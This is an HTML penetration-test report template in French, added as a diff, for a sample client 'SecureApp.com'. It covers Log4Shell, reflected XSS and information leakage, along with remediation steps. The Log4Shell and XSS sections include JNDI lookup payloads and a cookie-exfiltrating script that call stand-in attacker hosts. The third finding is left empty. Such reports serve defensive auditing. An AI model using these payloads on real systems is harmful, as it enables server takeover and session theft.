@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="fr">
+   <head>
+      <title>Rapport de Test d'Intrusion</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <style>
+         /* Style principal avec fond sombre et texte clair */
+         body {
+         font-family: 'Helvetica Neue', Helvetica, 'Segoe UI', Arial, sans-serif;
+         font-size: 16px;
+         line-height: 1.6;
+         color: #e2e8f0; /* Texte principal clair */
+         background-color: #111827; /* Fond sombre */
+         margin: 0;
+         padding: 20px;
+         }
+         /* Titres avec couleur plus claire */
+         h1, h2, h3, h4, h5, h6 {
+         color: #f8fafc; /* Blanc cassé */
+         line-height: 1.2;
+         margin-top: 1em;
+         margin-bottom: 16px;
+         }
+         h1 {
+         font-size: 2.25em;
+         font-weight: 300;
+         padding-bottom: .3em;
+         border-bottom: 1px solid #4b5563;
+         }
+         h2 {
+         font-size: 1.75em;
+         font-weight: 400;
+         padding-bottom: .3em;
+         border-bottom: 1px solid #4b5563;
+         }
+         h3 {
+         font-size: 1.5em;
+         font-weight: 500;
+         }
+         /* Liens avec couleur contrastée */
+         a {
+         color: #93c5fd; /* Bleu clair */
+         text-decoration: none;
+         }
+         a:hover {
+         color: #60a5fa; /* Bleu moyen au survol */
+         text-decoration: underline;
+         }
+         /* Tables */
+         table {
+         margin: 10px 0 15px 0;
+         border-collapse: collapse;
+         border-spacing: 0;
+         display: block;
+         width: 100%;
+         overflow: auto;
+         word-break: normal;
+         word-break: keep-all;
+         }
+         table th {
+         font-weight: 700;
+         color: #f8fafc; /* Blanc cassé */
+         background-color: #1e293b; /* Arrière-plan légèrement plus clair */
+         }
+         table td, table th {
+         border: 1px solid #4b5563;
+         padding: 6px 13px;
+         }
+         table tr:nth-child(even) {
+         background-color: #1f2937; /* Alternance de couleurs subtile */
+         }
+         /* Listes */
+         ul, ol {
+         padding-left: 2em;
+         margin-bottom: 16px;
+         }
+         /* Code et blocs de code */
+         code {
+         font-family: Menlo, Monaco, Consolas, 'Courier New', monospace;
+         font-size: .85em;
+         color: #f8fafc;
+         background-color: #1e293b;
+         border-radius: 3px;
+         padding: .2em .4em;
+         }
+         pre {
+         padding: 1em;
+         overflow: auto;
+         line-height: 1.45;
+         border: 1px solid #4b5563;
+         border-radius: 3px;
+         background-color: #1e293b;
+         margin-bottom: 16px;
+         }
+         pre code {
+         background-color: transparent;
+         padding: 0;
+         }
+         /* Citations */
+         blockquote {
+         margin: 16px 0;
+         padding: 0 15px;
+         color: #cbd5e1;
+         background-color: #1e293b;
+         border-left: 4px solid #4b5563;
+         }
+         /* Ligne horizontale */
+         hr {
+         height: 4px;
+         margin: 32px 0;
+         background-color: #4b5563;
+         border: 0 none;
+         }
+         /* Images */
+         img {
+         max-width: 100%;
+         border: 1px solid #4b5563;
+         border-radius: 5px;
+         }
+         /* Mise en page générale */
+         .markdown-preview {
+         width: 100%;
+         max-width: 900px;
+         margin: 0 auto;
+         padding: 20px;
+         }
+         /* Style pour les alertes */
+         .alert {
+         padding: 15px;
+         margin-bottom: 20px;
+         border-radius: 4px;
+         }
+         .alert-high {
+         background-color: rgba(220, 38, 38, 0.2);
+         border-left: 4px solid #dc2626;
+         }
+         .alert-medium {
+         background-color: rgba(245, 158, 11, 0.2);
+         border-left: 4px solid #f59e0b;
+         }
+         .alert-low {
+         background-color: rgba(16, 185, 129, 0.2);
+         border-left: 4px solid #10b981;
+         }
+         .severity-badge {
+         display: inline-block;
+         padding: 3px 8px;
+         border-radius: 3px;
+         font-size: 0.8em;
+         font-weight: bold;
+         }
+         .severity-high {
+         background-color: #dc2626;
+         color: white;
+         }
+         .severity-medium {
+         background-color: #f59e0b;
+         color: white;
+         }
+         .severity-low {
+         background-color: #10b981;
+         color: white;
+         }
+         /* Style pour les critères CVSS */
+         .cvss-metrics {
+         display: grid;
+         grid-template-columns: 1fr 1fr;
+         gap: 10px;
+         margin-bottom: 20px;
+         }
+         .cvss-metric {
+         background-color: #1e293b;
+         padding: 10px;
+         border-radius: 5px;
+         }
+         .cvss-metric h4 {
+         margin-top: 0;
+         margin-bottom: 5px;
+         color: #93c5fd;
+         }
+      </style>
+   </head>
+   <body>
+      <div class="markdown-preview">
+         <h1 id="rapport-de-test-dintrusion">Rapport de Test d'Intrusion</h1>
+         <h2 id="client">SecureApp.com</h2>
+         <table>
+            <thead>
+               <tr>
+                  <th>Propriété</th>
+                  <th>Valeur</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>Référence:</strong></td>
+                  <td>2025-SEC023</td>
+               </tr>
+               <tr>
+                  <td><strong>Préparé par:</strong></td>
+                  <td>Thomas Martin</td>
+               </tr>
+               <tr>
+                  <td><strong>Version du document:</strong></td>
+                  <td>1.0</td>
+               </tr>
+               <tr>
+                  <td><strong>Date:</strong></td>
+                  <td>11/03/2025</td>
+               </tr>
+               <tr>
+                  <td><strong>Type:</strong></td>
+                  <td>Audit de sécurité technique (pentest)</td>
+               </tr>
+               <tr>
+                  <td><strong>Durée:</strong></td>
+                  <td>5 jours</td>
+               </tr>
+               <tr>
+                  <td><strong>Lieu:</strong></td>
+                  <td>Audit en ligne</td>
+               </tr>
+               <tr>
+                  <td><strong>Contact:</strong></td>
+                  <td>contact@secureapp.com</td>
+               </tr>
+               <tr>
+                  <td><strong>Classification:</strong></td>
+                  <td>Confidentiel</td>
+               </tr>
+               <tr>
+                  <td><strong>Cible:</strong></td>
+                  <td>https://secureapp.com, IP: 203.0.113.42</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="historique-des-modifications">Historique des modifications</h2>
+         <table>
+            <thead>
+               <tr>
+                  <th>Version</th>
+                  <th>Date</th>
+                  <th>Description</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>V1.0</td>
+                  <td>11/03/2025</td>
+                  <td>Publication initiale</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="sommaire">Sommaire</h2>
+         <ol>
+            <li><a href="#résumé-exécutif">Résumé Exécutif</a></li>
+            <li><a href="#contexte-et-cadre">Contexte et Cadre du Test d'Intrusion</a></li>
+            <li><a href="#méthodologie">Méthodologie Technique et Évaluation</a></li>
+            <li><a href="#périmètre-technique">Périmètre Technique</a></li>
+            <li><a href="#participants">Participants</a></li>
+            <li><a href="#sommaire-vulnérabilités">Sommaire des Vulnérabilités et Recommandations</a></li>
+            <li><a href="#analyse-risque">Analyse du Risque Global</a></li>
+            <li><a href="#détails-vulnérabilités">Détails des Vulnérabilités</a></li>
+            <li><a href="#annexes">Annexes</a></li>
+         </ol>
+         <hr>
+         <h2 id="résumé-exécutif">Résumé Exécutif</h2>
+         <p>Ce rapport présente les résultats d'un test d'intrusion ciblé réalisé sur l'application web SecureApp, accessible via https://secureapp.com. L'objectif était d'identifier les vulnérabilités potentielles et d'évaluer le niveau de sécurité global de l'application.</p>
+         <p>Au cours de ce test, nous avons découvert 3 vulnérabilités qui pourraient compromettre la sécurité de l'application et de ses utilisateurs :</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Vulnérabilité</th>
+                  <th>Sévérité</th>
+                  <th>Impact Principal</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>Log4Shell (CVE-2021-44228)</strong></td>
+                  <td><span class="severity-badge severity-high">CVSS 10.0 (Critique)</span></td>
+                  <td>Exécution de code à distance sur le serveur de l'application</td>
+               </tr>
+               <tr>
+                  <td><strong>Cross-Site Scripting (XSS) Reflected</strong></td>
+                  <td><span class="severity-badge severity-medium">CVSS 6.1 (Moyen)</span></td>
+                  <td>Vol de session, phishing, exécution de code côté client</td>
+               </tr>
+               <tr>
+                  <td><strong>Fuite d'informations sensibles</strong></td>
+                  <td><span class="severity-badge severity-low">CVSS 3.5 (Bas)</span></td>
+                  <td>Divulgation de détails techniques pouvant faciliter d'autres attaques</td>
+               </tr>
+            </tbody>
+         </table>
+         <p>Ces vulnérabilités représentent un risque significatif pour l'intégrité des données, la confidentialité des utilisateurs et la réputation de l'application. Nous recommandons vivement de mettre en œuvre les correctifs proposés dans ce rapport dans les plus brefs délais, en particulier pour la vulnérabilité Log4Shell qui est de niveau critique.</p>
+         <hr>
+         <h2 id="contexte-et-cadre">Contexte et Cadre du Test d'Intrusion</h2>
+         <p>Thomas Martin (Secure Testing) a été invité à réaliser un audit de sécurité technique pour SecureApp.com, suite à une mise à jour majeure de la plateforme et avant son déploiement en production.</p>
+         <h3>Objectifs</h3>
+         <p>Les objectifs principaux de ce test d'intrusion étaient les suivants :</p>
+         <ul>
+            <li>Identifier les vulnérabilités potentielles dans l'application web et son infrastructure</li>
+            <li>Évaluer l'efficacité des mécanismes de sécurité en place</li>
+            <li>Déterminer l'impact potentiel de chaque vulnérabilité découverte</li>
+            <li>Fournir des recommandations pour renforcer la posture de sécurité</li>
+         </ul>
+         <h3>Limitations</h3>
+         <p>Les limitations suivantes ont été appliquées lors du test :</p>
+         <ul>
+            <li>Aucune attaque de type déni de service (DoS) n'a été réalisée</li>
+            <li>Les tests ont été effectués dans un environnement contrôlé</li>
+            <li>Les tests d'ingénierie sociale n'ont pas été inclus dans le périmètre</li>
+            <li>Les tests intrusifs ont été limités aux heures creuses pour minimiser l'impact</li>
+         </ul>
+         <hr>
+         <h2 id="méthodologie">Méthodologie Technique et Évaluation</h2>
+         <p>Le tableau suivant récapitule les niveaux de criticité basés sur le <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">Common Vulnerability Scoring System</a> (CVSS).</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Niveau</th>
+                  <th>Score CVSS</th>
+                  <th>Description</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>Critique</strong></td>
+                  <td>9-10</td>
+                  <td>Les vulnérabilités de niveau critique sont exploitables à distance (grande portée) et/ou sans conditions particulières d'accès et/ou sans authentification. Elles peuvent compromettre rapidement et facilement le système ciblé, voire les données utilisateurs. Elles doivent être traitées de façon urgente et prioritaire.</td>
+               </tr>
+               <tr>
+                  <td><strong>Haut</strong></td>
+                  <td>7-8.9</td>
+                  <td>Les vulnérabilités de niveau haut ont un impact sur le système ciblé et/ou peuvent être exploitées à distance et/ou sans authentification.</td>
+               </tr>
+               <tr>
+                  <td><strong>Moyen</strong></td>
+                  <td>4-6.9</td>
+                  <td>Les vulnérabilités de niveau moyen n'ont qu'une portée ou un impact réduit. L'exploitation requiert par exemple une authentification.</td>
+               </tr>
+               <tr>
+                  <td><strong>Bas</strong></td>
+                  <td>0.1-3.9</td>
+                  <td>Les vulnérabilités de niveau bas sont sans effet ou presque sur le système visé.</td>
+               </tr>
+               <tr>
+                  <td><strong>Nul</strong></td>
+                  <td>0</td>
+                  <td>Les vulnérabilités de niveau nul n'ont aucun impact sur le système visé.</td>
+               </tr>
+               <tr>
+                  <td><strong>Info</strong></td>
+                  <td>-</td>
+                  <td>Information donnée au sujet d'une vulnérabilité ou d'un système</td>
+               </tr>
+            </tbody>
+         </table>
+         <h3>Types de preuve et de correction</h3>
+         <p>Chaque vulnérabilité rapportée est fournie avec au moins un élément de preuve réplicable.</p>
+         <p>Voici quelques exemples de preuves possibles :</p>
+         <ol>
+            <li>Preuves techniques (bout de code, lien vers une page web, etc)</li>
+            <li>Preuves méthodologiques (utilisation d'outil, de méthodologies)</li>
+            <li>Preuves informelles (informations divulguées, etc)</li>
+         </ol>
+         <p>Chaque vulnérabilité rapportée est fournie avec un élément de correction (capture d'écran, preuve écrite ou lien web).</p>
+         <h3>Phases de Test</h3>
+         <p>Notre approche du test d'intrusion a suivi la méthodologie standard en six phases :</p>
+         <h4>1. Reconnaissance</h4>
+         <p>Collecte d'informations publiques sur l'application et son infrastructure, analyse des DNS, recherche de sous-domaines, et identification des technologies utilisées.</p>
+         <h4>2. Scan</h4>
+         <p>Nous avons effectué un scan complet de l'infrastructure en utilisant différents outils pour identifier les services exposés, les ports ouverts et les technologies utilisées :</p>
+         <ul>
+            <li><strong>Nmap</strong> : Scan de port complet avec détection de service et de système d'exploitation</li>
+            <li><strong>Curl</strong> : Analyse des en-têtes HTTP et des réponses du serveur</li>
+            <li><strong>WhatWeb</strong> : Identification des technologies web utilisées</li>
+            <li><strong>Nikto</strong> : Scan de vulnérabilités web génériques</li>
+         </ul>
+         <h4>3. Énumération</h4>
+         <p>Après avoir identifié les services disponibles, nous avons procédé à une énumération détaillée :</p>
+         <ul>
+            <li><strong>Gobuster</strong> : Découverte de répertoires et fichiers cachés</li>
+            <li><strong>FFuf</strong> : Fuzzing avancé pour identifier des points d'entrée potentiels</li>
+            <li><strong>DirBuster</strong> : Recherche exhaustive de contenus web</li>
+         </ul>
+         <h4>4. Analyse des vulnérabilités</h4>
+         <p>Analyse manuelle et automatisée des différents points d'entrée identifiés, tests d'injection, vérification des mécanismes d'authentification et d'autorisation, et analyse des données échangées.</p>
+         <h4>5. Exploitation</h4>
+         <p>Tentatives d'exploitation des vulnérabilités identifiées avec création de preuves de concept (PoC) et évaluation de l'impact réel sur le système.</p>
+         <h4>6. Documentation</h4>
+         <p>Documentation détaillée de toutes les découvertes, incluant les méthodes de reproduction, les preuves d'exploitation, l'analyse d'impact et les recommandations de correction.</p>
+         <h4>Outils utilisés</h4>
+         <table>
+            <thead>
+               <tr>
+                  <th>Outil</th>
+                  <th>Objectif</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>Nmap</td>
+                  <td>Scan de ports et de services</td>
+               </tr>
+               <tr>
+                  <td>Curl</td>
+                  <td>Analyse des réponses HTTP</td>
+               </tr>
+               <tr>
+                  <td>WhatWeb</td>
+                  <td>Identification des technologies</td>
+               </tr>
+               <tr>
+                  <td>Gobuster</td>
+                  <td>Recherche de répertoires et fichiers</td>
+               </tr>
+               <tr>
+                  <td>FFuf</td>
+                  <td>Fuzzing d'applications web</td>
+               </tr>
+               <tr>
+                  <td>Burp Suite</td>
+                  <td>Proxy d'interception et analyse web</td>
+               </tr>
+               <tr>
+                  <td>OWASP ZAP</td>
+                  <td>Scan automatisé de vulnérabilités</td>
+               </tr>
+               <tr>
+                  <td>Metasploit</td>
+                  <td>Framework d'exploitation</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="périmètre-technique">Périmètre Technique</h2>
+         <p>L'audit de sécurité a été mené sur l'environnement suivant :</p>
+         <ul>
+            <li>https://secureapp.com (203.0.113.42, ports 80, 443)</li>
+            <li>Application web SecureApp (interface principale et API)</li>
+            <li>Serveur backend (203.0.113.42, port 8080)</li>
+            <li>Système d'authentification et gestion des utilisateurs</li>
+         </ul>
+         <hr>
+         <h2 id="participants">Participants</h2>
+         <p>Les personnes suivantes ont participé au test d'intrusion :</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Nom et prénom</th>
+                  <th>E-mail</th>
+                  <th>Téléphone</th>
+                  <th>Rôle</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>Thomas Martin</td>
+                  <td>t.martin@securetesting.com</td>
+                  <td>01 23 45 67 89</td>
+                  <td>Auditeur technique principal</td>
+               </tr>
+               <tr>
+                  <td>Léa Dubois</td>
+                  <td>l.dubois@securetesting.com</td>
+                  <td>01 23 45 67 90</td>
+                  <td>Analyste de vulnérabilités web</td>
+               </tr>
+               <tr>
+                  <td>Karim Benali</td>
+                  <td>k.benali@securetesting.com</td>
+                  <td>01 23 45 67 91</td>
+                  <td>Spécialiste infrastructure</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="sommaire-vulnérabilités">Sommaire des Vulnérabilités trouvées et recommandations</h2>
+         <h3>Résumé de l'expertise</h3>
+         <table>
+            <thead>
+               <tr>
+                  <th>Page</th>
+                  <th>Vulnérabilité et Niveau de criticité</th>
+                  <th>Recommandations</th>
+                  <th>Actifs concernés</th>
+                  <th>Score CVSS</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>12</td>
+                  <td>CVE-2021-44228 - Log4Shell</td>
+                  <td>Mettre à jour Log4j vers la version 2.17.0 ou ultérieure</td>
+                  <td>Serveur d'application backend</td>
+                  <td>10.0</td>
+               </tr>
+               <tr>
+                  <td>15</td>
+                  <td>CWE-79 - Cross-Site Scripting (XSS)</td>
+                  <td>Implémenter l'échappement des données utilisateur</td>
+                  <td>https://secureapp.com/search.php</td>
+                  <td>6.1</td>
+               </tr>
+               <tr>
+                  <td>18</td>
+                  <td>CWE-200 - Fuite d'informations sensibles</td>
+                  <td>Configurer les en-têtes HTTP de sécurité</td>
+                  <td>Toutes les pages de l'application</td>
+                  <td>3.5</td>
+               </tr>
+            </tbody>
+         </table>
+         <p>Les tests effectués ont permis de dévoiler 3 vulnérabilités, dont une de niveau critique. La vulnérabilité Log4Shell (CVE-2021-44228) pourrait permettre à un attaquant d'exécuter du code arbitraire sur le serveur d'application. Cette vulnérabilité est particulièrement dangereuse car elle est facilement exploitable et a un impact élevé. Les deux autres vulnérabilités, bien que moins critiques, présentent également des risques pour la sécurité des utilisateurs et la confidentialité des données. Il est fortement recommandé de mettre en œuvre les correctifs proposés dans les plus brefs délais.</p>
+         <hr>
+         <h2 id="analyse-risque">Analyse du Risque Global</h2>
+         <h3>Facteurs d'attaque</h3>
+         <div class="cvss-metrics">
+            <div class="cvss-metric">
+               <h4>Vecteur d'attaque</h4>
+               <p>Réseau (Network) - AV:N</p>
+               <p>Attaque qui peut être menée depuis Internet sans accès physique ou local au système</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Complexité</h4>
+               <p>Faible (Low) - AC:L</p>
+               <p>Pas d'effort ou de préparation particulière requise pour l'exploitation</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Privilèges requis</h4>
+               <p>Aucun (None) - PR:N</p>
+               <p>Pas de compte utilisateur ou d'authentification préalable nécessaire</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Interaction humaine</h4>
+               <p>Requise (Required) - UI:R</p>
+               <p>Pour certaines vulnérabilités, une interaction avec un utilisateur légitime est nécessaire</p>
+            </div>
+         </div>
+         <h3>Facteurs d'impact</h3>
+         <div class="cvss-metrics">
+            <div class="cvss-metric">
+               <h4>Périmètre</h4>
+               <p>Changé (Changed) - S:C</p>
+               <p>L'attaque peut permettre d'exploiter davantage le système au-delà du composant vulnérable</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Confidentialité</h4>
+               <p>Élevée (High) - C:H</p>
+               <p>Les données confidentielles de l'application et des utilisateurs peuvent être compromises</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Intégrité</h4>
+               <p>Élevée (High) - I:H</p>
+               <p>Les données peuvent être modifiées ou altérées de manière significative</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Disponibilité</h4>
+               <p>Élevée (High) - A:H</p>
+               <p>L'application peut être rendue indisponible ou sérieusement compromise</p>
+            </div>
+         </div>
+         <hr>
+         <h2 id="détails-vulnérabilités">Détails des Vulnérabilités</h2>
+         <!-- Vulnérabilité 1: Log4Shell -->
+         <h3 id="vulnerabilite-1">CVE-2021-44228: Log4Shell</h3>
+         <div class="alert alert-high">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP Top 10</strong></td>
+                     <td><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06:2021 - Composants vulnérables et obsolètes</a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 10.0 (Critique)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Service Affecté</strong></td>
+                     <td>Serveur d'application backend (203.0.113.42:8080)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Composant vulnérable</strong></td>
+                     <td>Apache Log4j 2.14.1</td>
+                  </tr>
+                  <tr>
+                     <td><strong>CVE/CWE associée</strong></td>
+                     <td>CVE-2021-44228, CWE-917</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <h4>Description</h4>
+         <p>L'application utilise une version vulnérable d'Apache Log4j (2.14.1), qui est affectée par la vulnérabilité Log4Shell. Cette vulnérabilité permet à un attaquant d'exécuter du code arbitraire sur le serveur via l'injection de chaînes de caractères spécialement conçues qui sont traitées par le système de journalisation Log4j. Cette vulnérabilité est liée à la fonctionnalité JNDI (Java Naming and Directory Interface) de Log4j, qui peut être exploitée lorsqu'une application journalise des données contrôlées par l'utilisateur.</p>
+         <h4>Reproduction</h4>
+         <ol>
+            <li>Envoyer une requête POST à l'API avec le payload malveillant dans l'en-tête User-Agent: <code>${jndi:ldap://attacker-server.com/a}</code></li>
+            <li>Le serveur log l'en-tête User-Agent avec Log4j</li>
+            <li>Log4j interprète la chaîne et tente de se connecter au serveur LDAP externe contrôlé par l'attaquant</li>
+            <li>Le serveur LDAP malveillant renvoie un objet Java qui sera chargé et exécuté par la JVM de l'application</li>
+         </ol>
+         <h4>Preuve d'Exploitation</h4>
+         <p>Nous avons pu vérifier la présence de cette vulnérabilité en envoyant une requête contenant un payload JNDI pointant vers un serveur contrôlé:</p>
+         <pre><code>POST /api/login HTTP/1.1
+Host: secureapp.com
+User-Agent: ${jndi:ldap://attackerserver.com:1389/Exploit}
+Content-Type: application/json
+Content-Length: 36
+
+{"username":"test","password":"test"}</code></pre>
+         <p>Notre serveur LDAP de test a bien reçu une tentative de connexion du serveur victime, confirmant ainsi l'exécution du payload JNDI:</p>
+         <pre><code>[+] LDAP connection from 203.0.113.42 received
+[+] Received LDAP query for: Exploit
+[+] Sending LDAP referral result for Exploit
+[+] Attack successful - victim server attempted to load Java class</code></pre>
+         <h4>Impact</h4>
+         <p>Cette vulnérabilité a un impact critique sur la sécurité du système:</p>
+         <ul>
+            <li><strong>Exécution de code à distance (RCE)</strong> permettant à un attaquant de prendre le contrôle total du serveur</li>
+            <li><strong>Vol de données sensibles</strong> stockées sur le serveur ou accessibles depuis celui-ci</li>
+            <li><strong>Installation de malware persistant</strong> qui pourrait compromettre l'ensemble du réseau interne</li>
+            <li><strong>Élévation de privilèges</strong> sur le système compromis</li>
+         </ul>
+         <h4>Vecteurs d'attaque</h4>
+         <p>Plusieurs vecteurs d'attaque ont été identifiés:</p>
+         <ul>
+            <li>Via l'en-tête User-Agent: <code>${jndi:ldap://attacker.com/payload}</code></li>
+            <li>Via le champ username du formulaire de login: <code>${jndi:ldap://attacker.com/payload}</code></li>
+            <li>Via les paramètres de recherche: <code>${jndi:rmi://attacker.com/payload}</code></li>
+         </ul>
+         <h4>Recommandations</h4>
+         <ol>
+            <li>
+               <strong>Mise à jour immédiate</strong> - Mettre à jour Log4j vers la version 2.17.0 ou ultérieure:
+               <pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+    &lt;version&gt;2.17.1&lt;/version&gt;
+&lt;/dependency&gt;</code></pre>
+            </li>
+            <li>
+               <strong>Mitigation temporaire</strong> - Si une mise à jour immédiate n'est pas possible, définir la propriété système suivante:
+               <pre><code>-Dlog4j2.formatMsgNoLookups=true</code></pre>
+            </li>
+            <li><strong>Surveillance réseau</strong> - Mettre en place des règles de détection pour identifier les tentatives d'exploitation de Log4Shell</li>
+            <li><strong>Audit des journaux</strong> - Vérifier les journaux pour identifier d'éventuelles tentatives d'exploitation passées</li>
+         </ol>
+         <h4>Références</h4>
+         <ul>
+            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">NVD - CVE-2021-44228</a></li>
+            <li><a href="https://logging.apache.org/log4j/2.x/security.html">Apache Log4j Security Vulnerabilities</a></li>
+            <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Explication détaillée de la vulnérabilité Log4Shell</a></li>
+         </ul>
+         <hr>
+         <!-- Vulnérabilité 2: XSS -->
+         <h3 id="vulnerabilite-2">CWE-79: Cross-Site Scripting (XSS) Reflected</h3>
+         <div class="alert alert-medium">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP Top 10</strong></td>
+                     <td><a href="https://owasp.org/Top10/A03_2021-Injection/">A03:2021 - Injection</a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 6.1 (Moyen)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>URL Affectée</strong></td>
+                     <td>https://secureapp.com/search.php</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Paramètre vulnérable</strong></td>
+                     <td>query</td>
+                  </tr>
+                  <tr>
+                     <td><strong>CWE associée</strong></td>
+                     <td>CWE-79</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <h4>Description</h4>
+         <p>La page de recherche de l'application est vulnérable à une attaque de type Cross-Site Scripting (XSS) reflété. L'application insère directement le contenu du paramètre <code>query</code> dans la réponse HTML sans effectuer de validation ou d'échappement approprié. Cela permet à un attaquant d'injecter du code JavaScript malveillant qui sera exécuté dans le navigateur de la victime.</p>
+         <h4>Reproduction</h4>
+         <ol>
+            <li>Accéder à l'URL: <code>https://secureapp.com/search.php?query=test</code></li>
+            <li>Observer que le terme "test" est affiché dans la page</li>
+            <li>Remplacer "test" par une charge utile XSS: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+            <li>Constater que le code JavaScript est inséré dans la page et exécuté, affichant les cookies de l'utilisateur</li>
+         </ol>
+         <h4>Preuve d'Exploitation</h4>
+         <p>La charge utile XSS a été injectée via le paramètre <code>query</code> et a été reflétée dans le code HTML de la page sans échappement:</p>
+         <pre><code>&lt;h2&gt;Résultats de recherche pour : &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/h2&gt;
+&lt;p&gt;Aucun résultat trouvé pour &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/p&gt;</code></pre>
+         <h4>Impact</h4>
+         <p>Cette vulnérabilité peut être exploitée de plusieurs façons:</p>
+         <ul>
+            <li><strong>Vol de cookies de session</strong> - Un attaquant peut voler les cookies de session d'un utilisateur en injectant un code qui les envoie à un serveur contrôlé par l'attaquant</li>
+            <li><strong>Phishing</strong> - Un attaquant peut injecter du code qui modifie l'apparence de la page pour inciter l'utilisateur à divulguer des informations sensibles</li>
+            <li><strong>Exécution de code arbitraire</strong> - Un attaquant peut exécuter du code JavaScript dans le contexte du site, ce qui peut conduire à diverses attaques côté client</li>
+         </ul>
+         <h4>Vecteurs d'attaque</h4>
+         <p>Exemples de charges utiles malveillantes qui pourraient être utilisées:</p>
+         <ul>
+            <li>Vol de cookies: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></li>
+            <li>Redirection: <code>&lt;script&gt;window.location='https://attacker.com/fake-login'&lt;/script&gt;</code></li>
+            <li>Contournement de CSP: <code>&lt;script src="data:text/javascript,alert(document.domain)"&gt;&lt;/script&gt;</code></li>
+         </ul>
+         <h4>Recommandations</h4>
+         <ol>
+            <li>
+               <strong>Échappement des données de sortie</strong> - Utiliser des fonctions d'échappement HTML pour toutes les données utilisateur affichées dans les pages web :
+               <pre><code>// PHP
+$safe_query = htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
+echo "&lt;h2&gt;Résultats de recherche pour : " . $safe_query . "&lt;/h2&gt;";</code></pre>
+            </li>
+            <li><strong>Validation des entrées</strong> - Mettre en œuvre une validation stricte des entrées utilisateur pour rejeter tout contenu potentiellement malveillant</li>
+            <li>
+               <strong>Content Security Policy (CSP)</strong> - Mettre en place une politique CSP stricte pour limiter les sources de contenu autorisées :
+               <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>
+            </li>
+            <li><strong>HTTPOnly et Secure Cookies</strong> - Protéger les cookies de session avec les attributs HTTPOnly et Secure pour empêcher leur vol via XSS</li>
+         </ol>
+         <h4>Références</h4>
+         <ul>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+            <li><a href="https://www.php.net/manual/en/function.htmlspecialchars.php">Documentation PHP - htmlspecialchars</a></li>
+            <li><a href="https://content-security-policy.com/">Guide CSP</a></li>
+         </ul>
+         <hr>
+         <!-- Vulnérabilité 3: Fuite d'informations sensibles -->
+         <h3 id="vulnerabilite-3">CWE-200: Fuite d'informations sensibles</h3>
+         <div class="alert alert-low">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP Top 10</strong></td>
+                     <td><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05:2021 - Mauvaise configuration de sécurité</a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 3.5 (Bas)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>URL Affectée</strong></td>
+                     <td>Toutes les pages de l'application</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Composant vulnérable</strong></td>
+                     <td>Configuration du serveur web</td>
+                  </tr>
+                  <tr>
+                     <td><strong>CWE associée</strong></td>
+                     <td>CWE-200</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <hr>
+         <!-- Répéter le bloc précédent pour chaque vulnérabilité -->
+         <h2 id="annexes">Annexes</h2>
+         <p>[Inclure ici toute information complémentaire pertinente]</p>
+         <!-- Glossaire, outils supplémentaires, etc. -->
+      </div>
+   </body>
+</html>
